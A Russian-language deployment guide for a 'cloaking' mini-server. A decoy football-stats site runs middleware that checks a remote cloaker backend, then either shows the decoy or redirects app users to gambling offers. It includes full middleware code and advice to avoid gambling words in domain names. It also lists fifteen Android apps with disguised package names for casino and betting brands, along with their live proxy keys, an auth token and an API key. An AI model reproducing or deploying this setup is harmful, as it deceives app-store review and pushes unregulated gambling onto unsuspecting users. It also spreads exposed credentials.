# Настройка мини-сервера — пошаговый гайд

Как поднять мини-сервер (Football Hub) для каждого приложения, прикрутить middleware к кло и настроить авторизацию.

---

## Что это и зачем

Каждое приложение стучится на СВОЙ домен с СВОИМ мини-сервером. Мини-сервер — это Football Hub (или любая другая заглушка) с middleware, которая тихо спрашивает кло: "пропускать или нет?".

```
Приложение → твой-домен.com/football → middleware → кло → оффер или заглушка
```

Google видит только твой домен с футболом. Про кло не знает никто.

---

## Что нужно

- VPS ($3-5/мес) — Hetzner, DigitalOcean, Vultr, любой
- Домен ($1-10/год) — любой, без слов casino/bet/gambling
- Docker на VPS
- Proxy-key от кло (выдаём мы)
- Auth-токен (генеришь сам или берёшь готовый)

---

## Шаг 1: Купить VPS и домен

VPS:
- Ubuntu 22.04+
- 1 vCPU, 512MB RAM минимум
- Docker установлен

Домен:
- Любой нейтральный: `sportlive-app.com`, `game-stats.xyz`, `myapp-api.com`
- НЕ используй: `casino`, `bet`, `gambling`, `slot`, `poker`

DNS: направить A-запись домена на IP VPS.

## Шаг 2: Залить Football Hub на VPS

```bash
ssh root@YOUR_VPS_IP

# Склонировать или скопировать проект Football Hub
mkdir -p /opt/football-hub
cd /opt/football-hub

# Скопировать файлы проекта (scp или git clone)
# Структура должна быть:
# /opt/football-hub/
# ├── src/
# ├── public/
# ├── package.json
# ├── next.config.js
# ├── Dockerfile
# ├── docker-compose.yml
# └── .env
```

## Шаг 3: Настроить .env

```bash
cat > /opt/football-hub/.env << 'EOF'
# ── Football API (для заглушки) ─────────────────────────────
API_FOOTBALL_KEY=8f0658be5bc18a6cc493005a94c20559
API_FOOTBALL_BASE_URL=https://v3.football.api-sports.io

# ── Сайт ────────────────────────────────────────────────────
NEXT_PUBLIC_SITE_URL=https://ТВОЙ-ДОМЕН.com
NODE_ENV=production

# ── Кеш ─────────────────────────────────────────────────────
CACHE_TTL_LIVE_SECONDS=20
CACHE_TTL_STATS_SECONDS=300
CACHE_TTL_STATIC_SECONDS=3600

# ── Подключение к кло ───────────────────────────────────────
CLO_BACKEND=https://api.threeamigosteam.com/engine
CLO_PROXY_KEY=pk_ТВОЙ_КЛЮЧ_ПРИЛОЖЕНИЯ
CLO_SAFE_URL=https://ТВОЙ-ДОМЕН.com/football
CLO_APP_TOKEN=ТВОЙ_СЕКРЕТНЫЙ_ТОКЕН
EOF
```

### Что подставить:

| Переменная | Что это | Откуда взять |
|---|---|---|
| `NEXT_PUBLIC_SITE_URL` | Твой домен | Купил на шаге 1 |
| `CLO_PROXY_KEY` | Ключ приложения для кло | Выдаём мы (уникальный для каждой прилы) |
| `CLO_SAFE_URL` | URL заглушки | Твой домен + /football |
| `CLO_APP_TOKEN` | Секретный токен авторизации | Генеришь сам (любая строка) или берёшь готовый |

### Пример для Sisal 3:

```bash
CLO_BACKEND=https://api.threeamigosteam.com/engine
CLO_PROXY_KEY=pk_2b873b4c86446a29445c051a3a82d018
CLO_SAFE_URL=https://asisgameapp.com/football
CLO_APP_TOKEN=s3f8k2m9x4b7
```

## Шаг 4: Создать middleware

Файл `src/middleware.ts` — это мозг мини-сервера. Он перехватывает запросы на `/football` и решает: показать заглушку или редиректнуть на оффер.

```bash
cat > /opt/football-hub/src/middleware.ts << 'MWEOF'
import { NextRequest, NextResponse } from 'next/server';

const CLO_BACKEND = process.env.CLO_BACKEND || '';
const CLO_PROXY_KEY = process.env.CLO_PROXY_KEY || '';
const CLO_SAFE_URL = process.env.CLO_SAFE_URL || '';
const CLO_APP_TOKEN = process.env.CLO_APP_TOKEN || '';

export async function middleware(request: NextRequest) {
  const { searchParams } = request.nextUrl;
  const appId = searchParams.get('app_id');
  const sid = searchParams.get('sid');

  // Нет app_id → заглушка (браузер, модератор)
  if (!appId || !CLO_BACKEND || !CLO_PROXY_KEY) {
    return NextResponse.next();
  }

  // Неправильный токен → заглушка
  if (CLO_APP_TOKEN && sid !== CLO_APP_TOKEN) {
    return NextResponse.next();
  }

  try {
    const ip =
      request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      request.headers.get('x-real-ip') ||
      '0.0.0.0';

    const headers: Record<string, string> = {
      'X-Proxy-Key': CLO_PROXY_KEY,
      'X-Forwarded-For': ip,
      'X-Real-IP': ip,
      'User-Agent': request.headers.get('user-agent') || '',
      'Accept-Language': request.headers.get('accept-language') || '',
    };

    // Play Integrity токен (если приложение передало)
    const integrityToken = searchParams.get('integrity_token');
    if (integrityToken) headers['X-Integrity-Token'] = integrityToken;

    // Instance ID
    const instanceId = searchParams.get('instance_id');
    if (instanceId) headers['X-Instance-Id'] = instanceId;

    // Спрашиваем кло
    const res = await fetch(CLO_BACKEND + '/init', { headers });
    if (!res.ok) return NextResponse.next();

    const data = await res.json();
    const url = data.url;

    // Кло сказал "white" → заглушка
    if (!url || url === CLO_SAFE_URL) {
      return NextResponse.next();
    }

    // Кло сказал "grey" → redirect на оффер
    return NextResponse.redirect(url, 302);
  } catch {
    return NextResponse.next();
  }
}

export const config = {
  matcher: '/football',
};
MWEOF
```

## Шаг 5: Запустить Docker

```bash
cd /opt/football-hub
docker compose up -d --build
```

Подождать ~2 минуты пока соберётся и запустится.

Проверить:
```bash
docker ps
# Должно быть: Up X minutes (healthy)
```

## Шаг 6: Настроить Nginx (SSL)

Если ещё нет Nginx + SSL:

```bash
apt install nginx certbot python3-certbot-nginx -y

# Получить SSL сертификат
certbot --nginx -d ТВОЙ-ДОМЕН.com
```

Nginx конфиг (пример лежит в проекте: `nginx.conf.example`):

```nginx
server {
    listen 443 ssl;
    server_name ТВОЙ-ДОМЕН.com;

    ssl_certificate /etc/letsencrypt/live/ТВОЙ-ДОМЕН.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ТВОЙ-ДОМЕН.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

```bash
nginx -t && systemctl reload nginx
```

## Шаг 7: Проверить

```bash
# Без параметров → Football Hub (заглушка)
curl https://ТВОЙ-ДОМЕН.com/football
# Должен вернуть HTML с футболом

# С app_id + правильный токен → redirect на оффер
curl -v "https://ТВОЙ-ДОМЕН.com/football?app_id=com.package.name&sid=ТВОЙ_ТОКЕН"
# Должен вернуть 302 + Location: https://оффер-url

# С app_id + неправильный токен → Football Hub
curl "https://ТВОЙ-ДОМЕН.com/football?app_id=com.package.name&sid=WRONG"
# Должен вернуть HTML с футболом
```

## Шаг 8: Передать прогеру

Прогеру нужно знать 3 вещи:
1. **Домен**: `https://ТВОЙ-ДОМЕН.com`
2. **Path**: `/football`
3. **Токен**: `ТВОЙ_СЕКРЕТНЫЙ_ТОКЕН`

Прогер вставляет в Application:
```kotlin
val client = AppClient(
    context = this,
    endpoint = "https://ТВОЙ-ДОМЕН.com",
    path = "/football",
    authToken = "ТВОЙ_СЕКРЕТНЫЙ_ТОКЕН",
    enableIntegrity = !BuildConfig.DEBUG,
)
```

---

## Digital Asset Links

Чтобы приложение было привязано к домену (App Links), нужен файл `assetlinks.json`:

```bash
# Уже лежит в public/.well-known/assetlinks.json
# Обновить package_name и sha256_cert_fingerprints под свою прилу
```

```json
[
  {
    "relation": ["delegate_permission/common.handle_all_urls"],
    "target": {
      "namespace": "android_app",
      "package_name": "com.ТВОЙ.ПАКЕТ",
      "sha256_cert_fingerprints": ["XX:XX:XX:..."]
    }
  }
]
```

SHA-256 сертификата берёшь из `keytool` или Google Play Console.

---

## Как поднять для другого приложения

Тот же процесс, меняешь только:
1. Домен (новый)
2. `CLO_PROXY_KEY` (новый ключ, выдаём мы)
3. `CLO_APP_TOKEN` (новый токен, генеришь сам)
4. `CLO_SAFE_URL` (новый домен + /football)
5. `assetlinks.json` (новый package_name + cert)

Можно на одном VPS — разные поддомены:
```
sisal.domain1.com   → proxy-key sisal
betclic.domain1.com → proxy-key betclic
stake.domain2.com   → proxy-key stake
```

---

## Готовые ключи для приложений

Вот proxy-ключи для всех 15 приложений (прописаны на кло):

| Приложение | Package | Proxy Key |
|---|---|---|
| Betclic Sports | com.mazourbn.jaberbagh | `pk_daf8bde087935e228e4289bfa9155af1` |
| Stake | com.CamNangXayNha.ThietKeNhaO | `pk_80fcf5f7a3747824810438f8dd401b82` |
| Total Casino | com.ChuaBenhVaThuoc.TuDienThuoc | `pk_fb0509c15d5f71b5c5cce8bad51bddb9` |
| Snai | com.bft.omniconvert | `pk_57f599aa2e03d2c04d2bcf27c9106c11` |
| Goldbet | com.mahzorubhj.nutela | `pk_833588343cefee2a6625c205aeeee9e0` |
| Betclic | com.OnTapLop12.SoTayOnTap12 | `pk_fd79bdff36b8104f1e641c53474b9ee8` |
| Olimpbet | com.danhbadienthoai.sapxepdanhba | `pk_d1e585f770bbe787a8293f8fcea31298` |
| Sisal | com.CaTruVietNam.NgheThuatCaTru | `pk_5c5733835e9d56dc06ab72fc772347c0` |
| Olimpbet 2 | com.ThuThuatCasio.CasioThuThuat | `pk_0d329d768aae3a813cc80c9f2e7e5960` |
| Total Casino 2 | com.AnDamChoBe.AnDam | `pk_b73c9982912f058c461ce42eec4169fa` |
| Betsson | com.XeMay.OnThiLaiXeMayTracNghiem | `pk_8769f7d2341e26a8897b212126a27d53` |
| Betclic 2 | com.mahzouroubdf.kshk | `pk_7de77afafce0a5eaa3559973f20fdcf3` |
| Betsson 2 | com.TracNghiemOTo.OnThiLaiXeOto | `pk_32301f2bab4d6d80ed748179d44782e8` |
| Sisal 2 | com.pulsecospor.app | `pk_02d384a9a2f2d2fc5cb0f677aea744cf` |
| Sisal 3 | com.tools.lorenzo.precisionskintool | `pk_2b873b4c86446a29445c051a3a82d018` |

Auth-токен для Sisal 3: **`s3f8k2m9x4b7`**

Для новых приложений — пишите, сгенерируем новый ключ.

---

## Если что-то не работает

| Проблема | Решение |
|---|---|
| Docker не билдится | Проверь Node.js версию в Dockerfile (>=20) |
| 502 Bad Gateway | Docker контейнер не запустился: `docker logs football-hub` |
| SSL ошибка | Certbot: `certbot renew` |
| Redirect не работает | Проверь `.env`: CLO_BACKEND, CLO_PROXY_KEY |
| Всегда заглушка | Проверь CLO_APP_TOKEN совпадает с sid в приложении |
| Всегда оффер | Проверь CLO_SAFE_URL — должен совпадать с доменом |
